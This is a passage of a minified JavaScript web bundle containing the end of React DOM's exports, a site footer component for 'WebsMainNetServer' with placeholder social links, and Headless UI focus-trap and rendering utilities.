      : ((e = Object.keys(e).join(",")), Error(E(268, e)));
  return (e = mc(t)), (e = e === null ? null : e.stateNode), e;
};
Me.flushSync = function (e) {
  return mn(e);
};
Me.hydrate = function (e, t, n) {
  if (!xa(t)) throw Error(E(200));
  return ba(null, e, t, !0, n);
};
Me.hydrateRoot = function (e, t, n) {
  if (!es(e)) throw Error(E(405));
  var r = (n != null && n.hydratedSources) || null,
    l = !1,
    a = "",
    o = Kd;
  if (
    (n != null &&
      (n.unstable_strictMode === !0 && (l = !0),
      n.identifierPrefix !== void 0 && (a = n.identifierPrefix),
      n.onRecoverableError !== void 0 && (o = n.onRecoverableError)),
    (t = Qd(t, null, e, 1, n ?? null, l, !1, a, o)),
    (e[bt] = t.current),
    Rr(e),
    r)
  )
    for (e = 0; e < r.length; e++)
      (n = r[e]),
        (l = n._getVersion),
        (l = l(n._source)),
        t.mutableSourceEagerHydrationData == null
          ? (t.mutableSourceEagerHydrationData = [n, l])
          : t.mutableSourceEagerHydrationData.push(n, l);
  return new wa(t);
};
Me.render = function (e, t, n) {
  if (!xa(t)) throw Error(E(200));
  return ba(null, e, t, !1, n);
};
Me.unmountComponentAtNode = function (e) {
  if (!xa(e)) throw Error(E(40));
  return e._reactRootContainer
    ? (mn(function () {
        ba(null, null, e, !1, function () {
          (e._reactRootContainer = null), (e[bt] = null);
        });
      }),
      !0)
    : !1;
};
Me.unstable_batchedUpdates = Ki;
Me.unstable_renderSubtreeIntoContainer = function (e, t, n, r) {
  if (!xa(n)) throw Error(E(200));
  if (e == null || e._reactInternals === void 0) throw Error(E(38));
  return ba(e, t, n, !1, r);
};
Me.version = "18.2.0-next-9e3b772b8-20220608";
function Yd() {
  if (
    !(
      typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" ||
      typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"
    )
  )
    try {
      __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Yd);
    } catch (e) {
      console.error(e);
    }
}
Yd(), (Qu.exports = Me);
var Gd = Qu.exports,
  Cu = Gd;
(oo.createRoot = Cu.createRoot), (oo.hydrateRoot = Cu.hydrateRoot);
const Gm = () => {
  const e = [
    { name: "Twitter", link: "#" },
    { name: "Discord", link: "#" },
    { name: "GitHub", link: "#" },
    { name: "Mirror", link: "#" },
  ];
  return f.jsx("footer", {
    className: "bg-black rounded-lg shadow",
    children: f.jsxs("div", {
      className: "w-full max-w-screen-xl mx-auto p-4 md:py-8",
      children: [
        f.jsxs("div", {
          className: "sm:flex sm:items-center sm:justify-between",
          children: [
            f.jsxs("a", {
              href: "#",
              className:
                "flex items-center mb-4 sm:mb-0 space-x-3 rtl:space-x-reverse",
              children: [
                f.jsx("img", {
                  src: "/apex.png",
                  className: "h-8",
                  alt: "Flowbite Logo",
                }),
                f.jsx("span", {
                  className: "self-center text-2xl font-bold whitespace-nowrap",
                  children: "WebsMainNetServer",
                }),
              ],
            }),
            f.jsx("ul", {
              className:
                "flex flex-wrap items-center mb-6 text-sm font-medium text-gray-500 sm:mb-0",
              children: e.map((t) =>
                f.jsx(
                  "li",
                  {
                    children: f.jsx("a", {
                      href: t.link,
                      className: "hover:underline me-4 md:me-6",
                      children: t.name,
                    }),
                  },
                  t.name
                )
              ),
            }),
          ],
        }),
        f.jsx("hr", { className: "my-6 border-gray-600 sm:mx-auto  lg:my-8" }),
        f.jsxs("span", {
          className: "block text-sm text-gray-500 sm:text-center",
          children: [
            "© ",
            new Date().getFullYear() + " ",
            f.jsx("a", {
              href: "#",
              className: "hover:underline",
              children: "WebsMainNetServer™",
            }),
            ". All Rights Reserved.",
          ],
        }),
      ],
    }),
  });
};
var Xm = Object.defineProperty,
  Zm = (e, t, n) =>
    t in e
      ? Xm(e, t, { enumerable: !0, configurable: !0, writable: !0, value: n })
      : (e[t] = n),
  Ja = (e, t, n) => (Zm(e, typeof t != "symbol" ? t + "" : t, n), n);
let Jm = class {
    constructor() {
      Ja(this, "current", this.detect()),
        Ja(this, "handoffState", "pending"),
        Ja(this, "currentId", 0);
    }
    set(t) {
      this.current !== t &&
        ((this.handoffState = "pending"),
        (this.currentId = 0),
        (this.current = t));
    }
    reset() {
      this.set(this.detect());
    }
    nextId() {
      return ++this.currentId;
    }
    get isServer() {
      return this.current === "server";
    }
    get isClient() {
      return this.current === "client";
    }
    detect() {
      return typeof window > "u" || typeof document > "u" ? "server" : "client";
    }
    handoff() {
      this.handoffState === "pending" && (this.handoffState = "complete");
    }
    get isHandoffComplete() {
      return this.handoffState === "complete";
    }
  },
  wt = new Jm(),
  te = (e, t) => {
    wt.isServer ? p.useEffect(e, t) : p.useLayoutEffect(e, t);
  };
function He(e) {
  let t = p.useRef(e);
  return (
    te(() => {
      t.current = e;
    }, [e]),
    t
  );
}
let _ = function (e) {
  let t = He(e);
  return $.useCallback((...n) => t.current(...n), [t]);
};
function Xr(e) {
  typeof queueMicrotask == "function"
    ? queueMicrotask(e)
    : Promise.resolve()
        .then(e)
        .catch((t) =>
          setTimeout(() => {
            throw t;
          })
        );
}
function at() {
  let e = [],
    t = {
      addEventListener(n, r, l, a) {
        return (
          n.addEventListener(r, l, a),
          t.add(() => n.removeEventListener(r, l, a))
        );
      },
      requestAnimationFrame(...n) {
        let r = requestAnimationFrame(...n);
        return t.add(() => cancelAnimationFrame(r));
      },
      nextFrame(...n) {
        return t.requestAnimationFrame(() => t.requestAnimationFrame(...n));
      },
      setTimeout(...n) {
        let r = setTimeout(...n);
        return t.add(() => clearTimeout(r));
      },
      microTask(...n) {
        let r = { current: !0 };
        return (
          Xr(() => {
            r.current && n[0]();
          }),
          t.add(() => {
            r.current = !1;
          })
        );
      },
      style(n, r, l) {
        let a = n.style.getPropertyValue(r);
        return (
          Object.assign(n.style, { [r]: l }),
          this.add(() => {
            Object.assign(n.style, { [r]: a });
          })
        );
      },
      group(n) {
        let r = at();
        return n(r), this.add(() => r.dispose());
      },
      add(n) {
        return (
          e.push(n),
          () => {
            let r = e.indexOf(n);
            if (r >= 0) for (let l of e.splice(r, 1)) l();
          }
        );
      },
      dispose() {
        for (let n of e.splice(0)) n();
      },
    };
  return t;
}
function Zr() {
  let [e] = p.useState(at);
  return p.useEffect(() => () => e.dispose(), [e]), e;
}
function qm() {
  let e = typeof document > "u";
  return "useSyncExternalStore" in Nr
    ? ((t) => t.useSyncExternalStore)(Nr)(
        () => () => {},
        () => !1,
        () => !e
      )
    : !1;
}
function Xn() {
  let e = qm(),
    [t, n] = p.useState(wt.isHandoffComplete);
  return (
    t && wt.isHandoffComplete === !1 && n(!1),
    p.useEffect(() => {
      t !== !0 && n(!0);
    }, [t]),
    p.useEffect(() => wt.handoff(), []),
    e ? !1 : t
  );
}
var Pu;
let Oe =
  (Pu = $.useId) != null
    ? Pu
    : function () {
        let e = Xn(),
          [t, n] = $.useState(e ? () => wt.nextId() : null);
        return (
          te(() => {
            t === null && n(wt.nextId());
          }, [t]),
          t != null ? "" + t : void 0
        );
      };
function H(e, t, ...n) {
  if (e in t) {
    let l = t[e];
    return typeof l == "function" ? l(...n) : l;
  }
  let r = new Error(
    `Tried to handle "${e}" but there is no handler defined. Only defined handlers are: ${Object.keys(
      t
    )
      .map((l) => `"${l}"`)
      .join(", ")}.`
  );
  throw (Error.captureStackTrace && Error.captureStackTrace(r, H), r);
}
function Zn(e) {
  return wt.isServer
    ? null
    : e instanceof Node
    ? e.ownerDocument
    : e != null && e.hasOwnProperty("current") && e.current instanceof Node
    ? e.current.ownerDocument
    : document;
}
let ei = [
  "[contentEditable=true]",
  "[tabindex]",
  "a[href]",
  "area[href]",
  "button:not([disabled])",
  "iframe",
  "input:not([disabled])",
  "select:not([disabled])",
  "textarea:not([disabled])",
]
  .map((e) => `${e}:not([tabindex='-1'])`)
  .join(",");
var oe = ((e) => (
    (e[(e.First = 1)] = "First"),
    (e[(e.Previous = 2)] = "Previous"),
    (e[(e.Next = 4)] = "Next"),
    (e[(e.Last = 8)] = "Last"),
    (e[(e.WrapAround = 16)] = "WrapAround"),
    (e[(e.NoScroll = 32)] = "NoScroll"),
    e
  ))(oe || {}),
  $n = ((e) => (
    (e[(e.Error = 0)] = "Error"),
    (e[(e.Overflow = 1)] = "Overflow"),
    (e[(e.Success = 2)] = "Success"),
    (e[(e.Underflow = 3)] = "Underflow"),
    e
  ))($n || {}),
  e1 = ((e) => (
    (e[(e.Previous = -1)] = "Previous"), (e[(e.Next = 1)] = "Next"), e
  ))(e1 || {});
function Xd(e = document.body) {
  return e == null
    ? []
    : Array.from(e.querySelectorAll(ei)).sort((t, n) =>
        Math.sign(
          (t.tabIndex || Number.MAX_SAFE_INTEGER) -
            (n.tabIndex || Number.MAX_SAFE_INTEGER)
        )
      );
}
var ts = ((e) => (
  (e[(e.Strict = 0)] = "Strict"), (e[(e.Loose = 1)] = "Loose"), e
))(ts || {});
function ns(e, t = 0) {
  var n;
  return e === ((n = Zn(e)) == null ? void 0 : n.body)
    ? !1
    : H(t, {
        0() {
          return e.matches(ei);
        },
        1() {
          let r = e;
          for (; r !== null; ) {
            if (r.matches(ei)) return !0;
            r = r.parentElement;
          }
          return !1;
        },
      });
}
function Zd(e) {
  let t = Zn(e);
  at().nextFrame(() => {
    t && !ns(t.activeElement, 0) && Bt(e);
  });
}
var t1 = ((e) => (
  (e[(e.Keyboard = 0)] = "Keyboard"), (e[(e.Mouse = 1)] = "Mouse"), e
))(t1 || {});
typeof window < "u" &&
  typeof document < "u" &&
  (document.addEventListener(
    "keydown",
    (e) => {
      e.metaKey ||
        e.altKey ||
        e.ctrlKey ||
        (document.documentElement.dataset.headlessuiFocusVisible = "");
    },
    !0
  ),
  document.addEventListener(
    "click",
    (e) => {
      e.detail === 1
        ? delete document.documentElement.dataset.headlessuiFocusVisible
        : e.detail === 0 &&
          (document.documentElement.dataset.headlessuiFocusVisible = "");
    },
    !0
  ));
function Bt(e) {
  e == null || e.focus({ preventScroll: !0 });
}
let n1 = ["textarea", "input"].join(",");
function r1(e) {
  var t, n;
  return (n =
    (t = e == null ? void 0 : e.matches) == null ? void 0 : t.call(e, n1)) !=
    null
    ? n
    : !1;
}
function ln(e, t = (n) => n) {
  return e.slice().sort((n, r) => {
    let l = t(n),
      a = t(r);
    if (l === null || a === null) return 0;
    let o = l.compareDocumentPosition(a);
    return o & Node.DOCUMENT_POSITION_FOLLOWING
      ? -1
      : o & Node.DOCUMENT_POSITION_PRECEDING
      ? 1
      : 0;
  });
}
function l1(e, t) {
  return et(Xd(), t, { relativeTo: e });
}
function et(
  e,
  t,
  { sorted: n = !0, relativeTo: r = null, skipElements: l = [] } = {}
) {
  let a = Array.isArray(e)
      ? e.length > 0
        ? e[0].ownerDocument
        : document
      : e.ownerDocument,
    o = Array.isArray(e) ? (n ? ln(e) : e) : Xd(e);
  l.length > 0 && o.length > 1 && (o = o.filter((y) => !l.includes(y))),
    (r = r ?? a.activeElement);
  let i = (() => {
      if (t & 5) return 1;
      if (t & 10) return -1;
      throw new Error(
        "Missing Focus.First, Focus.Previous, Focus.Next or Focus.Last"
      );
    })(),
    s = (() => {
      if (t & 1) return 0;
      if (t & 2) return Math.max(0, o.indexOf(r)) - 1;
      if (t & 4) return Math.max(0, o.indexOf(r)) + 1;
      if (t & 8) return o.length - 1;
      throw new Error(
        "Missing Focus.First, Focus.Previous, Focus.Next or Focus.Last"
      );
    })(),
    u = t & 32 ? { preventScroll: !0 } : {},
    d = 0,
    v = o.length,
    g;
  do {
    if (d >= v || d + v <= 0) return 0;
    let y = s + d;
    if (t & 16) y = (y + v) % v;
    else {
      if (y < 0) return 3;
      if (y >= v) return 1;
    }
    (g = o[y]), g == null || g.focus(u), (d += i);
  } while (g !== a.activeElement);
  return t & 6 && r1(g) && g.select(), 2;
}
function Jd() {
  return (
    /iPhone/gi.test(window.navigator.platform) ||
    (/Mac/gi.test(window.navigator.platform) &&
      window.navigator.maxTouchPoints > 0)
  );
}
function a1() {
  return /Android/gi.test(window.navigator.userAgent);
}
function o1() {
  return Jd() || a1();
}
function wl(e, t, n) {
  let r = He(t);
  p.useEffect(() => {
    function l(a) {
      r.current(a);
    }
    return (
      document.addEventListener(e, l, n),
      () => document.removeEventListener(e, l, n)
    );
  }, [e, n]);
}
function qd(e, t, n) {
  let r = He(t);
  p.useEffect(() => {
    function l(a) {
      r.current(a);
    }
    return (
      window.addEventListener(e, l, n),
      () => window.removeEventListener(e, l, n)
    );
  }, [e, n]);
}
function ef(e, t, n = !0) {
  let r = p.useRef(!1);
  p.useEffect(() => {
    requestAnimationFrame(() => {
      r.current = n;
    });
  }, [n]);
  function l(o, i) {
    if (!r.current || o.defaultPrevented) return;
    let s = i(o);
    if (s === null || !s.getRootNode().contains(s) || !s.isConnected) return;
    let u = (function d(v) {
      return typeof v == "function"
        ? d(v())
        : Array.isArray(v) || v instanceof Set
        ? v
        : [v];
    })(e);
    for (let d of u) {
      if (d === null) continue;
      let v = d instanceof HTMLElement ? d : d.current;
      if (
        (v != null && v.contains(s)) ||
        (o.composed && o.composedPath().includes(v))
      )
        return;
    }
    return !ns(s, ts.Loose) && s.tabIndex !== -1 && o.preventDefault(), t(o, s);
  }
  let a = p.useRef(null);
  wl(
    "pointerdown",
    (o) => {
      var i, s;
      r.current &&
        (a.current =
          ((s = (i = o.composedPath) == null ? void 0 : i.call(o)) == null
            ? void 0
            : s[0]) || o.target);
    },
    !0
  ),
    wl(
      "mousedown",
      (o) => {
        var i, s;
        r.current &&
          (a.current =
            ((s = (i = o.composedPath) == null ? void 0 : i.call(o)) == null
              ? void 0
              : s[0]) || o.target);
      },
      !0
    ),
    wl(
      "click",
      (o) => {
        o1() || (a.current && (l(o, () => a.current), (a.current = null)));
      },
      !0
    ),
    wl(
      "touchend",
      (o) => l(o, () => (o.target instanceof HTMLElement ? o.target : null)),
      !0
    ),
    qd(
      "blur",
      (o) =>
        l(o, () =>
          window.document.activeElement instanceof HTMLIFrameElement
            ? window.document.activeElement
            : null
        ),
      !0
    );
}
function Jn(...e) {
  return p.useMemo(() => Zn(...e), [...e]);
}
function Tu(e) {
  var t;
  if (e.type) return e.type;
  let n = (t = e.as) != null ? t : "button";
  if (typeof n == "string" && n.toLowerCase() === "button") return "button";
}
function rs(e, t) {
  let [n, r] = p.useState(() => Tu(e));
  return (
    te(() => {
      r(Tu(e));
    }, [e.type, e.as]),
    te(() => {
      n ||
        (t.current &&
          t.current instanceof HTMLButtonElement &&
          !t.current.hasAttribute("type") &&
          r("button"));
    }, [n, t]),
    n
  );
}
let tf = Symbol();
function nf(e, t = !0) {
  return Object.assign(e, { [tf]: t });
}
function q(...e) {
  let t = p.useRef(e);
  p.useEffect(() => {
    t.current = e;
  }, [e]);
  let n = _((r) => {
    for (let l of t.current)
      l != null && (typeof l == "function" ? l(r) : (l.current = r));
  });
  return e.every((r) => r == null || (r == null ? void 0 : r[tf])) ? void 0 : n;
}
function Lu(e) {
  return [e.screenX, e.screenY];
}
function i1() {
  let e = p.useRef([-1, -1]);
  return {
    wasMoved(t) {
      let n = Lu(t);
      return e.current[0] === n[0] && e.current[1] === n[1]
        ? !1
        : ((e.current = n), !0);
    },
    update(t) {
      e.current = Lu(t);
    },
  };
}
function s1({ container: e, accept: t, walk: n, enabled: r = !0 }) {
  let l = p.useRef(t),
    a = p.useRef(n);
  p.useEffect(() => {
    (l.current = t), (a.current = n);
  }, [t, n]),
    te(() => {
      if (!e || !r) return;
      let o = Zn(e);
      if (!o) return;
      let i = l.current,
        s = a.current,
        u = Object.assign((v) => i(v), { acceptNode: i }),
        d = o.createTreeWalker(e, NodeFilter.SHOW_ELEMENT, u, !1);
      for (; d.nextNode(); ) s(d.currentNode);
    }, [e, r, l, a]);
}
function ls(e, t) {
  let n = p.useRef([]),
    r = _(e);
  p.useEffect(() => {
    let l = [...n.current];
    for (let [a, o] of t.entries())
      if (n.current[a] !== o) {
        let i = r(t, l);
        return (n.current = t), i;
      }
  }, [r, ...t]);
}
function ra(...e) {
  return Array.from(
    new Set(e.flatMap((t) => (typeof t == "string" ? t.split(" ") : [])))
  )
    .filter(Boolean)
    .join(" ");
}
var dt = ((e) => (
    (e[(e.None = 0)] = "None"),
    (e[(e.RenderStrategy = 1)] = "RenderStrategy"),
    (e[(e.Static = 2)] = "Static"),
    e
  ))(dt || {}),
  Rt = ((e) => (
    (e[(e.Unmount = 0)] = "Unmount"), (e[(e.Hidden = 1)] = "Hidden"), e
  ))(Rt || {});
function G({
  ourProps: e,
  theirProps: t,
  slot: n,
  defaultTag: r,
  features: l,
  visible: a = !0,
  name: o,
  mergeRefs: i,
}) {
  i = i ?? u1;
  let s = lf(t, e);
  if (a) return xl(s, n, r, o, i);
  let u = l ?? 0;
  if (u & 2) {
    let { static: d = !1, ...v } = s;
    if (d) return xl(v, n, r, o, i);
  }
  if (u & 1) {
    let { unmount: d = !0, ...v } = s;
    return H(d ? 0 : 1, {
      0() {
        return null;
      },
      1() {
        return xl({ ...v, hidden: !0, style: { display: "none" } }, n, r, o, i);
      },
    });
  }
  return xl(s, n, r, o, i);
}
function xl(e, t = {}, n, r, l) {
  let {
      as: a = n,
      children: o,
      refName: i = "ref",
      ...s
    } = qa(e, ["unmount", "static"]),
    u = e.ref !== void 0 ? { [i]: e.ref } : {},
    d = typeof o == "function" ? o(t) : o;
  "className" in s &&
    s.className &&
    typeof s.className == "function" &&
    (s.className = s.className(t));
  let v = {};
  if (t) {
    let g = !1,
      y = [];
    for (let [w, x] of Object.entries(t))
      typeof x == "boolean" && (g = !0), x === !0 && y.push(w);
    g && (v["data-headlessui-state"] = y.join(" "));
  }
  if (a === p.Fragment && Object.keys(ju(s)).length > 0) {
    if (!p.isValidElement(d) || (Array.isArray(d) && d.length > 1))
      throw new Error(
        [
          'Passing props on "Fragment"!',
          "",
          `The current component <${r} /> is rendering a "Fragment".`,
          "However we need to passthrough the following props:",
          Object.keys(s).map((x) => `  - ${x}`).join(`
`),
          "",
          "You can apply a few solutions:",
          [
            'Add an `as="..."` prop, to ensure that we render an actual element instead of a "Fragment".',
            "Render a single element as the child so that we can forward the props onto that element.",
          ].map((x) => `  - ${x}`).join(`
`),
        ].join(`
`)
      );
    let g = d.props,
      y =
        typeof (g == null ? void 0 : g.className) == "function"
          ? (...x) => ra(g == null ? void 0 : g.className(...x), s.className)
          : ra(g == null ? void 0 : g.className, s.className),
      w = y ? { className: y } : {};
    return p.cloneElement(
      d,
      Object.assign(
        {},
        lf(d.props, ju(qa(s, ["ref"]))),
        v,
        u,
        { ref: l(d.ref, u.ref) },
        w
      )
    );
  }
  return p.createElement(
    a,
    Object.assign(
      {},
      qa(s, ["ref"]),
      a !== p.Fragment && u,
      a !== p.Fragment && v
    ),
    d
  );
}
function rf() {
  let e = p.useRef([]),
    t = p.useCallback((n) => {
      for (let r of e.current)
        r != null && (typeof r == "function" ? r(n) : (r.current = n));
    }, []);
  return (...n) => {
    if (!n.every((r) => r == null)) return (e.current = n), t;
  };
}
function u1(...e) {
  return e.every((t) => t == null)
    ? void 0
    : (t) => {
        for (let n of e)
          n != null && (typeof n == "function" ? n(t) : (n.current = t));
      };
}
function lf(...e) {
  if (e.length === 0) return {};
  if (e.length === 1) return e[0];
  let t = {},
    n = {};
  for (let r of e)
    for (let l in r)
      l.startsWith("on") && typeof r[l] == "function"
        ? (n[l] != null || (n[l] = []), n[l].push(r[l]))
        : (t[l] = r[l]);
  if (t.disabled || t["aria-disabled"])
    return Object.assign(
      t,
      Object.fromEntries(Object.keys(n).map((r) => [r, void 0]))
    );
  for (let r in n)
    Object.assign(t, {
      [r](l, ...a) {
        let o = n[r];
        for (let i of o) {
          if (
            (l instanceof Event ||
              (l == null ? void 0 : l.nativeEvent) instanceof Event) &&
            l.defaultPrevented
          )
            return;
          i(l, ...a);
        }
      },
    });
  return t;
}
function K(e) {
  var t;
  return Object.assign(p.forwardRef(e), {
    displayName: (t = e.displayName) != null ? t : e.name,
  });
}
function ju(e) {
  let t = Object.assign({}, e);
  for (let n in t) t[n] === void 0 && delete t[n];
  return t;
}
function qa(e, t = []) {
  let n = Object.assign({}, e);
  for (let r of t) r in n && delete n[r];
  return n;
}
let c1 = "div";
var Br = ((e) => (
  (e[(e.None = 1)] = "None"),
  (e[(e.Focusable = 2)] = "Focusable"),
  (e[(e.Hidden = 4)] = "Hidden"),
  e
))(Br || {});
function d1(e, t) {
  var n;
  let { features: r = 1, ...l } = e,
    a = {
      ref: t,
      "aria-hidden":
        (r & 2) === 2 ? !0 : (n = l["aria-hidden"]) != null ? n : void 0,
      style: {
        position: "fixed",
        top: 1,
        left: 1,
        width: 1,
        height: 0,
        padding: 0,
        margin: -1,
        overflow: "hidden",
        clip: "rect(0, 0, 0, 0)",
        whiteSpace: "nowrap",
        borderWidth: "0",
        ...((r & 4) === 4 && (r & 2) !== 2 && { display: "none" }),
      },
    };
  return G({
    ourProps: a,
    theirProps: l,
    slot: {},
    defaultTag: c1,
    name: "Hidden",
  });
}
let Hr = K(d1),
  as = p.createContext(null);
as.displayName = "OpenClosedContext";
var re = ((e) => (
  (e[(e.Open = 1)] = "Open"),
  (e[(e.Closed = 2)] = "Closed"),
  (e[(e.Closing = 4)] = "Closing"),
  (e[(e.Opening = 8)] = "Opening"),
  e
))(re || {});
function Jr() {
  return p.useContext(as);
}
function os({ value: e, children: t }) {
  return $.createElement(as.Provider, { value: e }, t);
}
function f1(e) {
  function t() {
    document.readyState !== "loading" &&
      (e(), document.removeEventListener("DOMContentLoaded", t));
  }
  typeof window < "u" &&
    typeof document < "u" &&
    (document.addEventListener("DOMContentLoaded", t), t());
}
let $t = [];
f1(() => {
  function e(t) {
    t.target instanceof HTMLElement &&
      t.target !== document.body &&
      $t[0] !== t.target &&
      ($t.unshift(t.target),
      ($t = $t.filter((n) => n != null && n.isConnected)),
      $t.splice(10));
  }
  window.addEventListener("click", e, { capture: !0 }),
    window.addEventListener("mousedown", e, { capture: !0 }),
    window.addEventListener("focus", e, { capture: !0 }),
    document.body.addEventListener("click", e, { capture: !0 }),
    document.body.addEventListener("mousedown", e, { capture: !0 }),
    document.body.addEventListener("focus", e, { capture: !0 });
});
function is(e) {
  let t = e.parentElement,
    n = null;
  for (; t && !(t instanceof HTMLFieldSetElement); )
    t instanceof HTMLLegendElement && (n = t), (t = t.parentElement);
  let r = (t == null ? void 0 : t.getAttribute("disabled")) === "";
  return r && p1(n) ? !1 : r;
}
function p1(e) {
  if (!e) return !1;
  let t = e.previousElementSibling;
  for (; t !== null; ) {
    if (t instanceof HTMLLegendElement) return !1;
    t = t.previousElementSibling;
  }
  return !0;
}
function m1(e) {
  throw new Error("Unexpected object: " + e);
}
var tt = ((e) => (
  (e[(e.First = 0)] = "First"),
  (e[(e.Previous = 1)] = "Previous"),
  (e[(e.Next = 2)] = "Next"),
  (e[(e.Last = 3)] = "Last"),
  (e[(e.Specific = 4)] = "Specific"),
  (e[(e.Nothing = 5)] = "Nothing"),
  e
))(tt || {});
function h1(e, t) {
  let n = t.resolveItems();
  if (n.length <= 0) return null;
  let r = t.resolveActiveIndex(),
    l = r ?? -1;
  switch (e.focus) {
    case 0: {
      for (let a = 0; a < n.length; ++a)
        if (!t.resolveDisabled(n[a], a, n)) return a;
      return r;
    }
    case 1: {
      for (let a = l - 1; a >= 0; --a)
        if (!t.resolveDisabled(n[a], a, n)) return a;
      return r;
    }
    case 2: {
      for (let a = l + 1; a < n.length; ++a)
        if (!t.resolveDisabled(n[a], a, n)) return a;
      return r;
    }
    case 3: {
      for (let a = n.length - 1; a >= 0; --a)
        if (!t.resolveDisabled(n[a], a, n)) return a;
      return r;
    }
    case 4: {
      for (let a = 0; a < n.length; ++a)
        if (t.resolveId(n[a], a, n) === e.id) return a;
      return r;
    }
    case 5:
      return null;
    default:
      m1(e);
  }
}
var D = ((e) => (
  (e.Space = " "),
  (e.Enter = "Enter"),
  (e.Escape = "Escape"),
  (e.Backspace = "Backspace"),
  (e.Delete = "Delete"),
  (e.ArrowLeft = "ArrowLeft"),
  (e.ArrowUp = "ArrowUp"),
  (e.ArrowRight = "ArrowRight"),
  (e.ArrowDown = "ArrowDown"),
  (e.Home = "Home"),
  (e.End = "End"),
  (e.PageUp = "PageUp"),
  (e.PageDown = "PageDown"),
  (e.Tab = "Tab"),
  e
))(D || {});
function af(e, t, n, r) {
  let l = He(n);
  p.useEffect(() => {
    e = e ?? window;
    function a(o) {
      l.current(o);
    }
    return e.addEventListener(t, a, r), () => e.removeEventListener(t, a, r);
  }, [e, t, r]);
}
function qn() {
  let e = p.useRef(!1);
  return (
    te(
      () => (
        (e.current = !0),
        () => {
          e.current = !1;
        }
      ),
      []
    ),
    e
  );
}
function of(e) {
  let t = _(e),
    n = p.useRef(!1);
  p.useEffect(
    () => (
      (n.current = !1),
      () => {
        (n.current = !0),
          Xr(() => {
            n.current && t();
          });
      }
    ),
    [t]
  );
}
var hr = ((e) => (
  (e[(e.Forwards = 0)] = "Forwards"), (e[(e.Backwards = 1)] = "Backwards"), e
))(hr || {});
function v1() {
  let e = p.useRef(0);
  return (
    qd(
      "keydown",
      (t) => {
        t.key === "Tab" && (e.current = t.shiftKey ? 1 : 0);
      },
      !0
    ),
    e
  );
}
function sf(e) {
  if (!e) return new Set();
  if (typeof e == "function") return new Set(e());
  let t = new Set();
  for (let n of e.current) n.current instanceof HTMLElement && t.add(n.current);
  return t;
}
let g1 = "div";
var uf = ((e) => (
  (e[(e.None = 1)] = "None"),
  (e[(e.InitialFocus = 2)] = "InitialFocus"),
  (e[(e.TabLock = 4)] = "TabLock"),
  (e[(e.FocusLock = 8)] = "FocusLock"),
  (e[(e.RestoreFocus = 16)] = "RestoreFocus"),
  (e[(e.All = 30)] = "All"),
  e
))(uf || {});
function y1(e, t) {
  let n = p.useRef(null),
    r = q(n, t),
    { initialFocus: l, containers: a, features: o = 30, ...i } = e;
  Xn() || (o = 1);
  let s = Jn(n);
  b1({ ownerDocument: s }, !!(o & 16));
  let u = k1({ ownerDocument: s, container: n, initialFocus: l }, !!(o & 2));
  S1(
    { ownerDocument: s, container: n, containers: a, previousActiveElement: u },
    !!(o & 8)
  );
  let d = v1(),
    v = _((x) => {
      let k = n.current;
      k &&
        ((m) => m())(() => {
          H(d.current, {
            [hr.Forwards]: () => {
              et(k, oe.First, { skipElements: [x.relatedTarget] });
            },
            [hr.Backwards]: () => {
              et(k, oe.Last, { skipElements: [x.relatedTarget] });
            },
          });
        });
    }),
    g = Zr(),
    y = p.useRef(!1),
    w = {
      ref: r,
      onKeyDown(x) {
        x.key == "Tab" &&
          ((y.current = !0),
          g.requestAnimationFrame(() => {
            y.current = !1;
          }));
      },
      onBlur(x) {
        let k = sf(a);
        n.current instanceof HTMLElement && k.add(n.current);
        let m = x.relatedTarget;
        m instanceof HTMLElement &&
          m.dataset.headlessuiFocusGuard !== "true" &&
          (cf(k, m) ||
            (y.current
              ? et(
                  n.current,
                  H(d.current, {
                    [hr.Forwards]: () => oe.Next,
                    [hr.Backwards]: () => oe.Previous,
                  }) | oe.WrapAround,
                  { relativeTo: x.target }
                )
              : x.target instanceof HTMLElement && Bt(x.target)));
      },
    };
  return $.createElement(
    $.Fragment,
    null,
    !!(o & 4) &&
      $.createElement(Hr, {
        as: "button",
        type: "button",
        "data-headlessui-focus-guard": !0,
        onFocus: v,
        features: Br.Focusable,
      }),
    G({ ourProps: w, theirProps: i, defaultTag: g1, name: "FocusTrap" }),
    !!(o & 4) &&
      $.createElement(Hr, {
        as: "button",
        type: "button",
        "data-headlessui-focus-guard": !0,
        onFocus: v,
        features: Br.Focusable,
      })
  );
}
let w1 = K(y1),
  sr = Object.assign(w1, { features: uf });
function x1(e = !0) {
  let t = p.useRef($t.slice());
  return (
    ls(
      ([n], [r]) => {
        r === !0 &&
          n === !1 &&
          Xr(() => {
            t.current.splice(0);
          }),
          r === !1 && n === !0 && (t.current = $t.slice());
      },
      [e, $t, t]
    ),
    _(() => {
      var n;
      return (n = t.current.find((r) => r != null && r.isConnected)) != null
        ? n
        : null;
    })
  );
}
function b1({ ownerDocument: e }, t) {
  let n = x1(t);
  ls(() => {
    t ||
      ((e == null ? void 0 : e.activeElement) ===
        (e == null ? void 0 : e.body) &&
        Bt(n()));
  }, [t]),
    of(() => {
      t && Bt(n());
    });
}
function k1({ ownerDocument: e, container: t, initialFocus: n }, r) {
  let l = p.useRef(null),
    a = qn();
  return (
    ls(() => {
      if (!r) return;
      let o = t.current;
      o &&
        Xr(() => {
          if (!a.current) return;
          let i = e == null ? void 0 : e.activeElement;
          if (n != null && n.current) {
            if ((n == null ? void 0 : n.current) === i) {
              l.current = i;
              return;
            }
          } else if (o.contains(i)) {
            l.current = i;
            return;
          }
          n != null && n.current
            ? Bt(n.current)
            : et(o, oe.First) === $n.Error &&
              console.warn(
                "There are no focusable elements inside the <FocusTrap />"
              ),
            (l.current = e == null ? void 0 : e.activeElement);
        });
    }, [r]),
    l
  );
}
function S1(
  { ownerDocument: e, container: t, containers: n, previousActiveElement: r },
  l
) {
  let a = qn();
  af(
    e == null ? void 0 : e.defaultView,
    "focus",
    (o) => {
      if (!l || !a.current) return;
      let i = sf(n);
      t.current instanceof HTMLElement && i.add(t.current);
      let s = r.current;
      if (!s) return;
      let u = o.target;
      u && u instanceof HTMLElement
        ? cf(i, u)
          ? ((r.current = u), Bt(u))
          : (o.preventDefault(), o.stopPropagation(), Bt(s))
        : Bt(r.current);
    },
    !0
  );
}
function cf(e, t) {
  for (let n of e) if (n.contains(t)) return !0;
  return !1;
}
let df = p.createContext(!1);
function E1() {
  return p.useContext(df);
}
function ti(e) {
  return $.createElement(df.Provider, { value: e.force }, e.children);
}
function N1(e) {
  let t = E1(),
    n = p.useContext(ff),
